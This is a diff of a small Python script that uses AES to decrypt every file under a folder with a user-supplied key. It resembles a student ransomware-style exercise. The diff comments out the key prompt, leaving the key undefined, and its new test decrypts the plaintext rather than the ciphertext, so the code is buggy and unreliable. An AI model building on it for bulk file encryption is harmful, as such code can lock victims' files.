@@ -43,7 +43,8 @@ def decrypt():
 
 
 def encrypt():
-    ui_key = input("Enter a key to decrypt all of the files:")
+    # ui_key = input("Enter a key to decrypt all of the files:")
+    # TODO: uncomment before send
     dkey=base64.b64decode(ui_key)
     for root,dirs,files in os.walk(folder_path):
         for a_file in files:
@@ -60,12 +61,15 @@ def encrypt():
     print(f"Your files in {folder_path} and it's subfolders have been decrypted!")
 
 
-data = b"Yaryna"
-print(f"We want to encrypt data:{data}" )
-key=get_random_bytes(16)
-cipher=AES.new(key, AES.MODE_OFB)
-encr=cipher.encrypt(data)
-print(f"Our data has been encrypted:{data}")
-d_cipher=AES.new(key,AES.MODE_OFB)
-decr=d_cipher.decrypt(data)
-print(f"Our data has been decrypted:{data}")
+def test_encryption_on_one_word():
+    data = b"Yaryna"
+    print(f"We want to encrypt data:{data}")
+    key = get_random_bytes(16)
+    cipher = AES.new(key, AES.MODE_OFB)
+    encr = cipher.encrypt(data)
+    print(f"Our data has been encrypted:{encr}")
+    d_cipher = AES.new(key, AES.MODE_OFB)
+    decr = d_cipher.decrypt(data)
+    print(f"Our data has been decrypted:{decr}")
+test_encryption_on_one_word()
+
